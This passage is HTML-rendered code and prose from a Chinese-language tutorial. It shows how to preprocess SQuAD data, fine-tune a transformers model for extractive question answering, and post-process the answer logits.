<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-built_in">None</span>]<br></code></pre></td></tr></table></figure><p><code>None</code>对应了specialtokens，然后0或者1分表代表第1个文本和第2个文本，由于我们qeustin第1个传入，context第2个传入，所以分别对应question和context。最终我们可以找到标注的答案在预处理之后的features里的位置:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python">answers = example[<span class="hljs-string">&quot;answers&quot;</span>]<br>start_char = answers[<span class="hljs-string">&quot;answer_start&quot;</span>][<span class="hljs-number">0</span>]<br>end_char = start_char + <span class="hljs-built_in">len</span>(answers[<span class="hljs-string">&quot;text&quot;</span>][<span class="hljs-number">0</span>])<br><br><span class="hljs-comment"># 找到当前文本的Start token index.</span><br>token_start_index = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> sequence_ids[token_start_index] != <span class="hljs-number">1</span>:<br>    token_start_index += <span class="hljs-number">1</span><br><br><span class="hljs-comment"># 找到当前文本的End token idnex.</span><br>token_end_index = <span class="hljs-built_in">len</span>(tokenized_example[<span class="hljs-string">&quot;input_ids&quot;</span>][<span class="hljs-number">0</span>]) - <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> sequence_ids[token_end_index] != <span class="hljs-number">1</span>:<br>    token_end_index -= <span class="hljs-number">1</span><br><br><span class="hljs-comment"># 检测答案是否在文本区间的外部，这种情况下意味着该样本的数据标注在CLS token位置。</span><br>offsets = tokenized_example[<span class="hljs-string">&quot;offset_mapping&quot;</span>][<span class="hljs-number">0</span>]<br><span class="hljs-keyword">if</span> (offsets[token_start_index][<span class="hljs-number">0</span>] &lt;= start_char <span class="hljs-keyword">and</span> offsets[token_end_index][<span class="hljs-number">1</span>] &gt;= end_char):<br>    <span class="hljs-comment"># 将token_start_index和token_end_index移动到answer所在位置的两侧.</span><br>    <span class="hljs-comment"># 注意：答案在最末尾的边界条件.</span><br>    <span class="hljs-keyword">while</span> token_start_index &lt; <span class="hljs-built_in">len</span>(offsets) <span class="hljs-keyword">and</span> offsets[token_start_index][<span class="hljs-number">0</span>] &lt;= start_char:<br>        token_start_index += <span class="hljs-number">1</span><br>    start_position = token_start_index - <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> offsets[token_end_index][<span class="hljs-number">1</span>] &gt;= end_char:<br>        token_end_index -= <span class="hljs-number">1</span><br>    end_position = token_end_index + <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;start_position: &#123;&#125;, end_position: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(start_position, end_position))<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;The answer is not in this feature.&quot;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">start_position</span>: <span class="hljs-number">23</span>, end_position: <span class="hljs-number">26</span><br></code></pre></td></tr></table></figure><p>我们需要对答案的位置进行验证，验证方式是：使用答案所在位置下标，取到对应的tokenID，然后转化为文本，然后和原始答案进行但对比。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(tokenizer.decode(tokenized_example[<span class="hljs-string">&quot;input_ids&quot;</span>][<span class="hljs-number">0</span>][start_position: end_position+<span class="hljs-number">1</span>]))<br><span class="hljs-built_in">print</span>(answers[<span class="hljs-string">&quot;text&quot;</span>][<span class="hljs-number">0</span>])<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">over</span> <span class="hljs-number">1</span>, <span class="hljs-number">600</span><br><span class="hljs-attribute">over</span> <span class="hljs-number">1</span>,<span class="hljs-number">600</span><br></code></pre></td></tr></table></figure><p>有时候question拼接context，而有时候是context拼接question，不同的模型有不同的要求，因此我们需要使用<code>padding_side</code>参数来指定。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">pad_on_right = tokenizer.padding_side == <span class="hljs-string">&quot;right&quot;</span>  <span class="hljs-comment"># context在右边</span><br></code></pre></td></tr></table></figure><p>现在，把所有步骤合并到一起。对于context中无答案的情况，我们直接将标注的答案起始位置和结束位置放置在CLS的下标处。如果<code>allow_impossible_answers</code>这个参数是<code>False</code>的化，那这些无答案的样本都会被扔掉。现在，把所有步骤合并到一起。对于context中无答案的情况，我们直接将标注的答案起始位置和结束位置放置在CLS的下标处。如果<code>allow_impossible_answers</code>这个参数是<code>False</code>的化，那这些无答案的样本都会被扔掉。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">prepare_train_features</span>(<span class="hljs-params">examples</span>):<br>    <span class="hljs-comment"># 既要对examples进行truncation（截断）和padding（补全）还要还要保留所有信息，所以要用的切片的方法。</span><br>    <span class="hljs-comment"># 每一个一个超长文本example会被切片成多个输入，相邻两个输入之间会有交集。</span><br>    tokenized_examples = tokenizer(<br>        examples[<span class="hljs-string">&quot;question&quot;</span> <span class="hljs-keyword">if</span> pad_on_right <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;context&quot;</span>],<br>        examples[<span class="hljs-string">&quot;context&quot;</span> <span class="hljs-keyword">if</span> pad_on_right <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;question&quot;</span>],<br>        truncation=<span class="hljs-string">&quot;only_second&quot;</span> <span class="hljs-keyword">if</span> pad_on_right <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;only_first&quot;</span>,<br>        max_length=max_length,<br>        stride=doc_stride,<br>        return_overflowing_tokens=<span class="hljs-literal">True</span>,<br>        return_offsets_mapping=<span class="hljs-literal">True</span>,<br>        padding=<span class="hljs-string">&quot;max_length&quot;</span>,<br>    )<br><br>    <span class="hljs-comment"># 我们使用overflow_to_sample_mapping参数来映射切片片ID到原始ID。</span><br>    <span class="hljs-comment"># 比如有2个expamples被切成4片，那么对应是[0, 0, 1, 1]，前两片对应原来的第一个example。</span><br>    sample_mapping = tokenized_examples.pop(<span class="hljs-string">&quot;overflow_to_sample_mapping&quot;</span>)<br>    <span class="hljs-comment"># offset_mapping也对应4片</span><br>    <span class="hljs-comment"># offset_mapping参数帮助我们映射到原始输入，由于答案标注在原始输入上，所以有助于我们找到答案的起始和结束位置。</span><br>    offset_mapping = tokenized_examples.pop(<span class="hljs-string">&quot;offset_mapping&quot;</span>)<br><br>    <span class="hljs-comment"># 重新标注数据</span><br>    tokenized_examples[<span class="hljs-string">&quot;start_positions&quot;</span>] = []<br>    tokenized_examples[<span class="hljs-string">&quot;end_positions&quot;</span>] = []<br><br>    <span class="hljs-keyword">for</span> i, offsets <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(offset_mapping):<br>        <span class="hljs-comment"># 对每一片进行处理</span><br>        <span class="hljs-comment"># 将无答案的样本标注到CLS上</span><br>        input_ids = tokenized_examples[<span class="hljs-string">&quot;input_ids&quot;</span>][i]<br>        cls_index = input_ids.index(tokenizer.cls_token_id)<br><br>        <span class="hljs-comment"># 区分question和context</span><br>        sequence_ids = tokenized_examples.sequence_ids(i)<br><br>        <span class="hljs-comment"># 拿到原始的example 下标.</span><br>        sample_index = sample_mapping[i]<br>        answers = examples[<span class="hljs-string">&quot;answers&quot;</span>][sample_index]<br>        <span class="hljs-comment"># 如果没有答案，则使用CLS所在的位置为答案.</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(answers[<span class="hljs-string">&quot;answer_start&quot;</span>]) == <span class="hljs-number">0</span>:<br>            tokenized_examples[<span class="hljs-string">&quot;start_positions&quot;</span>].append(cls_index)<br>            tokenized_examples[<span class="hljs-string">&quot;end_positions&quot;</span>].append(cls_index)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 答案的character级别Start/end位置.</span><br>            start_char = answers[<span class="hljs-string">&quot;answer_start&quot;</span>][<span class="hljs-number">0</span>]<br>            end_char = start_char + <span class="hljs-built_in">len</span>(answers[<span class="hljs-string">&quot;text&quot;</span>][<span class="hljs-number">0</span>])<br><br>            <span class="hljs-comment"># 找到token级别的index start.</span><br>            token_start_index = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">while</span> sequence_ids[token_start_index] != (<span class="hljs-number">1</span> <span class="hljs-keyword">if</span> pad_on_right <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>):<br>                token_start_index += <span class="hljs-number">1</span><br><br>            <span class="hljs-comment"># 找到token级别的index end.</span><br>            token_end_index = <span class="hljs-built_in">len</span>(input_ids) - <span class="hljs-number">1</span><br>            <span class="hljs-keyword">while</span> sequence_ids[token_end_index] != (<span class="hljs-number">1</span> <span class="hljs-keyword">if</span> pad_on_right <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>):<br>                token_end_index -= <span class="hljs-number">1</span><br><br>            <span class="hljs-comment"># 检测答案是否超出文本长度，超出的话也适用CLS index作为标注.</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (offsets[token_start_index][<span class="hljs-number">0</span>] &lt;= start_char <span class="hljs-keyword">and</span> offsets[token_end_index][<span class="hljs-number">1</span>] &gt;= end_char):<br>                tokenized_examples[<span class="hljs-string">&quot;start_positions&quot;</span>].append(cls_index)<br>                tokenized_examples[<span class="hljs-string">&quot;end_positions&quot;</span>].append(cls_index)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># 如果不超出则找到答案token的start和end位置。.</span><br>                <span class="hljs-comment"># Note: we could go after the last offset if the answer is the last word (edge case).</span><br>                <span class="hljs-keyword">while</span> token_start_index &lt; <span class="hljs-built_in">len</span>(offsets) <span class="hljs-keyword">and</span> offsets[token_start_index][<span class="hljs-number">0</span>] &lt;= start_char:<br>                    token_start_index += <span class="hljs-number">1</span><br>                tokenized_examples[<span class="hljs-string">&quot;start_positions&quot;</span>].append(token_start_index - <span class="hljs-number">1</span>)<br>                <span class="hljs-keyword">while</span> offsets[token_end_index][<span class="hljs-number">1</span>] &gt;= end_char:<br>                    token_end_index -= <span class="hljs-number">1</span><br>                tokenized_examples[<span class="hljs-string">&quot;end_positions&quot;</span>].append(token_end_index + <span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">return</span> tokenized_examples<br></code></pre></td></tr></table></figure><h2 id="fine-tuning微调模型">Fine-tuning微调模型</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> transformers <span class="hljs-keyword">import</span> AutoModelForQuestionAnswering, TrainingArguments, Trainer<br><br>model = AutoModelForQuestionAnswering.from_pretrained(model_checkpoint)<br></code></pre></td></tr></table></figure><p>训练参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">args = TrainingArguments(<br>    <span class="hljs-string">f&quot;test-squad&quot;</span>,<br>    evaluation_strategy = <span class="hljs-string">&quot;epoch&quot;</span>,<br>    learning_rate=<span class="hljs-number">2e-5</span>, <span class="hljs-comment">#学习率</span><br>    per_device_train_batch_size=batch_size,<br>    per_device_eval_batch_size=batch_size,<br>    num_train_epochs=<span class="hljs-number">3</span>, <span class="hljs-comment"># 训练的论次</span><br>    weight_decay=<span class="hljs-number">0.01</span>,<br>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> transformers <span class="hljs-keyword">import</span> default_data_collator<br><br>data_collator = default_data_collator<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">trainer = Trainer(<br>    model,<br>    args,<br>    train_dataset=tokenized_datasets[<span class="hljs-string">&quot;train&quot;</span>],<br>    eval_dataset=tokenized_datasets[<span class="hljs-string">&quot;validation&quot;</span>],<br>    data_collator=data_collator,<br>    tokenizer=tokenizer,<br>)<br><br><span class="hljs-comment">#  开始训练</span><br>trainer.train()<br><br><span class="hljs-comment">#  保存模型</span><br>trainer.save_model(<span class="hljs-string">&quot;test-squad-trained&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="evaluation评估">Evaluation评估</h2><p>我们需要将模型的输出后处理成我们需要的文本格式。模型本身预测的是answer所在start/end位置的logits。如果我们评估时喂入模型的是一个batch，那么输出如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><br><span class="hljs-keyword">for</span> batch <span class="hljs-keyword">in</span> trainer.get_eval_dataloader():<br>    <span class="hljs-keyword">break</span><br>batch = &#123;k: v.to(trainer.args.device) <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> batch.items()&#125;<br><span class="hljs-keyword">with</span> torch.no_grad():<br>    output = trainer.model(**batch)<br>output.keys()<br></code></pre></td></tr></table></figure><p>模型的输出是一个像dict的数据结构，包含了loss（因为提供了label，所有有loss），answerstart和end的logits。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">output.start_logits.shape, output.end_logits.shape<br><br>(torch.Size([<span class="hljs-number">16</span>, <span class="hljs-number">384</span>]), torch.Size([<span class="hljs-number">16</span>, <span class="hljs-number">384</span>]))<br></code></pre></td></tr></table></figure><p>每个feature里的每个token都会有一个logit。预测answer最简单的方法就是选择start的logits里最大的下标最为answer其实位置，end的logits里最大下标作为answer的结束位置。</p><p>以上策略大部分情况下都是不错的。但是，如果我们的输入告诉我们找不到答案：比如start的位置比end的位置下标大，或者start和end的位置指向了question。</p><p>这个时候，简单的方法是我们继续需要选择第2好的预测作为我们的答案了，实在不行看第3好的预测，以此类推。</p><p>由于上面的方法不太容易找到可行的答案，我们需要思考更合理的方法。我们将start和end的logits相加得到新的打分，然后去看最好的<code>n_best_size</code>个start和end对。从<code>n_best_size</code>个start和end对里推出相应的答案，然后检查答案是否有效，最后将他们按照打分进行怕苦，选择得分最高的作为答案。由于上面的方法不太容易找到可行的答案，我们需要思考更合理的方法。我们将start和end的logits相加得到新的打分，然后去看最好的<code>n_best_size</code>个start和end对。从<code>n_best_size</code>个start和end对里推出相应的答案，然后检查答案是否有效，最后将他们按照打分进行怕苦，选择得分最高的作为答案。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">n_best_size = <span class="hljs-number">20</span><br><br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>start_logits = output.start_logits[<span class="hljs-number">0</span>].cpu().numpy()<br>end_logits = output.end_logits[<span class="hljs-number">0</span>].cpu().numpy()<br><span class="hljs-comment"># 收集最佳的start和end logits的位置:</span><br>start_indexes = np.argsort(start_logits)[-<span class="hljs-number">1</span> : -n_best_size - <span class="hljs-number">1</span> : -<span class="hljs-number">1</span>].tolist()<br>end_indexes = np.argsort(end_logits)[-<span class="hljs-number">1</span> : -n_best_size - <span class="hljs-number">1</span> : -<span class="hljs-number">1</span>].tolist()<br>valid_answers = []<br><span class="hljs-keyword">for</span> start_index <span class="hljs-keyword">in</span> start_indexes:<br>    <span class="hljs-keyword">for</span> end_index <span class="hljs-keyword">in</span> end_indexes:<br>        <span class="hljs-keyword">if</span> start_index &lt;= end_index: <span class="hljs-comment"># 如果start小雨end，那么合理的</span><br>            valid_answers.append(<br>                &#123;<br>                    <span class="hljs-string">&quot;score&quot;</span>: start_logits[start_index] + end_logits[end_index],<br>                    <span class="hljs-string">&quot;text&quot;</span>: <span class="hljs-string">&quot;&quot;</span> <span class="hljs-comment"># 后续需要根据token的下标将答案找出来</span><br>                &#125;<br>            )<br></code></pre></td></tr></table></figure><p>随后我们对根据<code>score</code>对<code>valid_answers</code>进行排序，找到最好的那一个。最后还剩一步是：检查start和end位置对应的文本是否在context里面而不是在question里面。</p><p>为了完成这件事情，我们需要添加以下两个信息到validation的features里面：</p><ul><li>产生feature的example的ID。由于每个example可能会产生多个feature，所以每个feature/切片的feature需要知道他们对应的example。</li><li>offset mapping：将每个切片的tokens的位置映射会原始文本基于character的下标位置。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">prepare_validation_features</span>(<span class="hljs-params">examples</span>):<br>    <span class="hljs-comment"># Tokenize our examples with truncation and maybe padding, but keep the overflows using a stride. This results</span><br>    <span class="hljs-comment"># in one example possible giving several features when a context is long, each of those features having a</span><br>    <span class="hljs-comment"># context that overlaps a bit the context of the previous feature.</span><br>    tokenized_examples = tokenizer(<br>        examples[<span class="hljs-string">&quot;question&quot;</span> <span class="hljs-keyword">if</span> pad_on_right <span class="hljs-keyword">else</span> <span 